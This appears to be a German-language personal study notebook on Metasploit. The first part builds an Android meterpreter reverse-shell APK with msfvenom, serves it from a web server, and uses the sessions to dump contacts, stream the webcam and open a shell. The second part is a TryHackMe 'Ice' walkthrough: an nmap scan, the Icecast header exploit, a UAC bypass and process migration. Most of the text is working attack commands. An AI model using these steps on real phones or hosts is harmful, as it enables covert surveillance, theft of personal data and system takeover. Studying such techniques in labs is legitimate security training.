# android hacking with metasploit kali 
#### datum: 13.05.2020
[link](https://www.youtube.com/watch?v=YRm-St0bJhU)
---
###
> 1. es wird eine android applikation erstellt, mit einer einfachen view 
> 2. msfvenom (framework) 
> 2.1. msfpayload
> 2.2. msfencode 	

```
0. [new terminal 0]
1. [0] ifconfig 
2. [0] msfvenom -help 
3. [0] msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 R > /var/www/html/androidApp.apk
4. [0] service apache2 status 
5. [0] msfconsole 
6. [0] use exploit/mulit/handler
7. [0] set payload android/meterpreter/reverse-tcp 
8. [0] show options
9. [0] set LHOST 192.168.1.23 [ip-Virtual Box]
10. [0] show options
11. [0] exploit 
12. [0] background
13. [0] sessions
14. [0] sessions -i 1
15. [0] help
16. [0] app_list
17. [0] dump_contacts
18. [new terminal 1]
19. [1] cat contacts dump 20190915183350.txt
20. [0] webcam_list
21. [0] background
22. [0] exploit (muli/handler)
23. [0] sessions
24. [0] exploit
25. [0] background
26. [0] sessions
27. [0] sessions -i 8
28. [0] help
29. [0] webcam_list
30. [0] shell
31. [0] ls
32. [0] whoiam
33. [0] pwd
```
---
### prof. 
> snap-shot mit der handykamera // stream 
```
0. use exploit/multi/handler
1. set payload android/meterpreter/reverse_tcp
2. set lhost 192.168.0.132
3. show options 
4. exploit 
5. webcam_steam -h // get help
6. webcam_list
7. webcam_stream -d 5 -i 1 // d (duration aufnahmezeit/ index of webcam)
8. [rage quit]
9. cd /home/kali/
10. msfconsole
11. [alles wie vorher]
12. webcam_stream -d 5 -i 1 
13. cp [daten] /var/www/html 
```

---
# ice 
[link room tryhackme]()

## task1 
verbinden

## task 2
> nmap -sC -sV -oN ice.nmap 10.10.87.148
### ergebnis
```
# Nmap 7.80 scan initiated Wed May 13 10:19:06 2020 as: nmap -sC -sV -oN ice.nmap 10.10.87.148
Nmap scan report for 10.10.87.148
Host is up (0.074s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-05-13T08:20:13+00:00; -2s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m57s, deviation: 2h30m00s, median: -2s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:73:37:13:4c:70 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-13T03:20:07-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-13T08:20:07
|_  start_date: 2020-05-13T08:13:20

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 13 10:21:15 2020 -- 1 IP address (1 host up) scanned in 129.06 seconds
```
1. **3389** <br>
[https://www.cvedetails.com/](https://www.cvedetails.com/)
2. **execute code overflow**
3. **CVE-2004-1561**
> search icecast
> use 0
6. **RHOSTS** 
> setg rhosts 10.10.87.148
7. Video 
[https://www.youtube.com/watch?v=qUQhCrpBEK4](https://www.youtube.com/watch?v=qUQhCrpBEK4)
> use exploit/windows/http/icecast_header <br>
> set rhosts 10.10.87.148 <br>
> exploit <br>
> sessions  <br>
> use /post/multi/recon/local_exploit_suggester <br>
> set sessions 1 <br>
> exploit <br>
> use windows/local/bypassuac_eventvwr<br>
> set session 7 <br>
> set lhost 10.10.83.15 <br>
> getprivs <br>
> migrate -N spoolsv.exe<br>
---
10.10.207.74
### next try

#### lhosts vpn ip adresse 
[https://www.youtube.com/watch?v=490l9BoUGD4](https://www.youtube.com/watch?v=490l9BoUGD4)
> search icecast <br>
> searchsploit icecast
> zwischenablage 2.0.1 (Windows x86) - Header Overwrite (Metasploit) <br>
> internet <br>
> search uac<br>
> use 4<br>
> options <br>
> set payload windows/meterpreter/reverse_tcp<br>
> set lhosts 10.10.207.74<br>
> 